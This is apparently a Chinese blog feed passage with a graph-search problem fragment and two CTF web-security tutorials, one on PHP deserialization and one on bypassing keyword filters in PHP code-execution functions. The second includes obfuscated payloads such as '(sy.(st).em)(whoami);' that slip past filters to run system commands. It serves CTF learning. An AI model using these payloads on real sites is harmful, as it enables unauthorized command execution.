xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mn>2</mn><mo>→</mo><mn>4</mn><mo>→</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">1\to 2\to 4\to 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 条 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mn>3</mn><mo>→</mo><mn>4</mn><mo>→</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">1\to 3\to 4\to 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span>（由于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>→</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">4\to 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span> 的边有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 条）。</p><p>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">20\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">1\le N \le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span></span></span></span>；<br>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>60</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">60\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">6</span><span class="mord">0</span><span class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">1\le N \le 10^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span>；<br>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>100</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">100\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup></mrow><annotation encoding="application/x-tex">1\le N\le10^6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>M</mi><mo>≤</mo><mn>2</mn><mo>×</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup></mrow><annotation encoding="application/x-tex">1\le M\le 2\times 10^6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span>。</p><h1 id="题解-3"><a class="markdownIt-Anchor" href="#题解-3">#</a> 题解</h1>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深搜 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2023/11/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/11/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="php序列化问题-主要是找链-分析代码"><a class="markdownIt-Anchor" href="#php序列化问题-主要是找链-分析代码">#</a> PHP 序列化问题 -&gt; 主要是找链 分析代码</h2><h3 id="反序列化魔术方法"><a class="markdownIt-Anchor" href="#反序列化魔术方法">#</a> 反序列化魔术方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()<span class="comment">//当一个对象创建时被调用</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//当一个对象销毁时被调用</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//当一个对象被当作一个字符串使用</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()<span class="comment">//在对象在被序列化之前运行</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()<span class="comment">//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>()<span class="comment">//获得一个类的成员变量时调用</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>()<span class="comment">//设置一个类的成员变量时调用</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()<span class="comment">//调用函数的方式调用一个对象时的回应方法</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>()<span class="comment">//当调用一个对象中的不能用的方法的时候就会执行这个函数</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//执行unserialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() <span class="comment">//执行serialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><h3 id="简介"><a class="markdownIt-Anchor" href="#简介">#</a> 简介</h3><p>序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p><p>在网上找到一个比较形象的例子</p><blockquote><p>比如：现在我们都会在淘宝上买桌子，桌子这种很不规则的东西，该怎么从一个城市运输到另一个城市，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。</p></blockquote><p>php 将数据序列化和反序列化会用到两个函数</p><p><strong>serialize</strong> 将对象格式化成有序的字符串</p><p><strong>unserialize</strong> 将字符串还原成原来的对象</p><p>序列化的目的是方便数据的传输和存储，在 PHP 中，序列化和反序列化一般用做缓存，比如 session 缓存，cookie 等。</p><h3 id="常见的序列化格式"><a class="markdownIt-Anchor" href="#常见的序列化格式">#</a> 常见的序列化格式</h3><p>了解即可</p><ul><li>二进制格式</li><li>字节数组</li><li>json 字符串</li><li>xml 字符串</li></ul><h3 id="案例引入"><a class="markdownIt-Anchor" href="#案例引入">#</a> 案例引入</h3><p>简单的例子 (以数组为例子)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">array</span>(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$user</span>.PHP_EOL);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>));</span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;xiao&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;shi&quot;</span>;i:<span class="number">2</span>;s:<span class="number">2</span>:<span class="string">&quot;zi&quot;</span>;&#125;</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; xiao</span><br><span class="line">    [<span class="number">1</span>] =&gt; shi</span><br><span class="line">    [<span class="number">2</span>] =&gt; zi</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>我们对上面这个例子做个简单讲解，方便大家入门</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;xiao&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;shi&quot;</span>;i:<span class="number">2</span>;s:<span class="number">2</span>:<span class="string">&quot;zi&quot;</span>;&#125;</span><br><span class="line">a:<span class="keyword">array</span>代表是数组，后面的<span class="number">3</span>说明有三个属性</span><br><span class="line">i:代表是整型数据<span class="keyword">int</span>，后面的<span class="number">0</span>是数组下标</span><br><span class="line">s:代表是字符串，后面的<span class="number">4</span>是因为xiao长度为<span class="number">4</span></span><br><span class="line">    </span><br><span class="line">依次类推</span><br></pre></td></tr></table></figure><p>序列化后的内容只有成员变量，没有成员函数，比如下面的例子</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出 (O 代表 Object 是对象的意思，也是类)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;xiaoshizi&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>而如果变量前是 protected，则会在变量名前加上 <code>\x00*\x00</code> ,private 则会在变量名前加上 <code>\x00类名\x00</code> , 输出时一般需要 url 编码，若在本地存储更推荐采用 base64 编码的形式，如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这时候输出则会导致不可见字符 <code>\x00</code>  的丢失 (故要 urlencode)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot; * a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;xiaoshizi&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot; test b&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="反序列化绕过小trick"><a class="markdownIt-Anchor" href="#反序列化绕过小trick">#</a> 反序列化绕过小 Trick</h3><h4 id="php71反序列化对类属性不敏感"><a class="markdownIt-Anchor" href="#php71反序列化对类属性不敏感">#</a> php7.1 + 反序列化对类属性不敏感</h4><p>我们前面说了如果变量前是 protected，序列化结果会在变量名前加上 <code>\x00*\x00</code></p><p>但在特定版本 7.1 以上则对于类属性不敏感，比如下面的例子即使没有 <code>\x00*\x00</code>  也依然会输出 <code>abc</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则绕过</title>
      <link href="/2023/11/12/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/"/>
      <url>/2023/11/12/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="代码执行函数"><a class="markdownIt-Anchor" href="#代码执行函数">#</a> <strong>代码执行函数</strong></h2><p>首先</p><p><strong>eval()</strong></p><p>最常见的代码执行函数 把字符串 code 作为 PHP 代码执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span> ( <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p><strong>assert()</strong></p><p>检测一个断言是否为 <strong>false</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP <span class="number">5</span></span><br><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP <span class="number">7</span></span><br><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p><code>assert()</code>  会检查指定的 <code>assertion</code>  并在结果为 <code>false</code>  时采取适当的行动。在 <code>PHP5</code>  或 <code>PHP7</code>  中，如果 <code>assertion</code>  是字符串，它将会被 <code>assert()</code>  当做 <code>PHP</code>  代码来执行。</p><p><strong>preg_replace()+/e</strong></p><p>执行一个正则表达式的搜索和替换（一般用来）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>搜索 <code>subject</code>  中匹配 <code>pattern</code>  的部分，以 <code>replacement</code>  进行替换。如果 <code>pattern</code>  的模式修饰符使用 <code>/e</code> ，那么当 <code>subject</code>  被匹配成功时， <code>replacement</code>  会被当做 PHP 代码执行</p><blockquote><p><strong>PS：  <code>preg_replace()+</code>  函数的 <code>/e</code>  修饰符在 <code>PHP7</code>  中被移除</strong></p></blockquote><p><strong>create_function()</strong></p><p>创建一个匿名 (lambda 样式) 函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span> ( <span class="keyword">string</span> <span class="variable">$args</span> , <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>根据传递的参数创建一个匿名函数，并为其返回唯一的名称。如果没有严格对参数传递进行过滤，攻击者可以构造 payload 传递给 <code>create_function()</code>  对 <code>参数或函数体</code> <br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102205746960.png?raw=true" alt="在这里插入图片描述"></p><h2 id="可回调函数"><a class="markdownIt-Anchor" href="#可回调函数">#</a> <strong>可回调函数</strong></h2><p><strong>array_map()</strong></p><p>为数组的每个元素应用回调函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> , <span class="keyword">array</span> <span class="variable">$array</span> , <span class="keyword">array</span> ...<span class="variable">$arrays</span> ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>返回数组，是为 <code>array</code>  每个元素应用 <code>callback</code>  函数之后的数组。  <code>array_map()</code>  返回一个 <code>array</code> ，数组内容为 <code>array1</code>  的元素按索引顺序为参数调用 <code>callback</code>  后的结果（有更多数组时，还会传入 <code>arrays</code>  的元素）。  <code>callback</code>  函数形参的数量必须匹配 <code>array_map()</code>  实参中数组的数量。</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/2021010221241094.png?raw=true" alt="在这里插入图片描述"></p><p><strong>call_user_func()</strong></p><p>把第一个参数作为回调函数调用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">mixed</span> <span class="variable">$parameter</span> [, <span class="keyword">mixed</span> $... ]] ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>第一个参数 <code>callback</code>  是被调用的回调函数，其余参数是回调函数的参数。</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102215723117.png?raw=true" alt="在这里插入图片描述"></p><p><strong>call_user_func_array()</strong></p><p>调用回调函数，并把一个数组参数作为回调函数的参数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> , <span class="keyword">array</span> <span class="variable">$param_arr</span> ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>把第一个参数作为回调函数 <code>callback</code>  调用，把参数数组作 <code>param_arr</code>  为回调函数的的参数传入。跟 <code>array_map()</code>  相似</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102220152139.png?raw=true" alt="在这里插入图片描述"></p><p><strong>array_filter()</strong></p><p>用回调函数过滤数组中的单元</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_filter</span> ( <span class="keyword">array</span> <span class="variable">$array</span> [, <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">int</span> <span class="variable">$flag</span> = <span class="number">0</span> ]] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>依次将 <code>array</code>  数组中的每个值传递到 <code>callback</code>  函数。如果 <code>callback</code>  函数返回 <code>true</code> ，则 <code>array</code>  数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102220700697.png?raw=true" alt="在这里插入图片描述"></p><p><strong>usort()</strong></p><p>使用用户自定义的比较函数对数组中的值进行排序</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">usort</span> ( <span class="keyword">array</span> &amp;<span class="variable">$array</span> , <span class="keyword">callable</span> <span class="variable">$value_compare_func</span> ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p><p>当 <code>PHP &lt; 5.6</code>  时</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210103123448401.png?raw=true" alt="在这里插入图片描述"></p><p>当 <code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>  时，php 有一个 <code>参数变长</code> 特性</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210103205857483.png?raw=true" alt="在这里插入图片描述"></p><h2 id="字符串拼接绕过"><a class="markdownIt-Anchor" href="#字符串拼接绕过">#</a> <strong>字符串拼接绕过</strong></h2><p>字符串拼接绕过适用于过滤具体关键字的限制</p><p>使用 PHP &gt;=7</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210103225920322.png?raw=true" alt="在这里插入图片描述"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">(sy.(st).em)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><blockquote><p>在 PHP 中不一定需要 <code>引号(单引号/双引号)</code>  来表示字符串。PHP 支持我们声明元素的类型，比如 <code>$name = (string)mochu7;</code> ，在这种情况下， <code>$name</code>  就包含字符串 <code>&quot;mochu7&quot;</code> ，此外，如果不显示声明类型，那么 PHP 会将 <code>圆括号内的数据当成字符串</code> 来处理</p></blockquote><h2 id="字符串转义绕过"><a class="markdownIt-Anchor" href="#字符串转义绕过">#</a> <strong>字符串转义绕过</strong></h2><p>适用版本 PHP&gt;=7</p><p>以八进制表示的 <code>\[0–7]&#123;1,3&#125;</code>  转义字符会自动适配 byte（如 <code>&quot;\400&quot; == “\000”</code> ）<br>以十六进制的 <code>\x[0–9A-Fa-f]&#123;1,2&#125;</code>  转义字符表示法（如 <code>“\x41&quot;</code> ）<br>以 Unicode 表示的 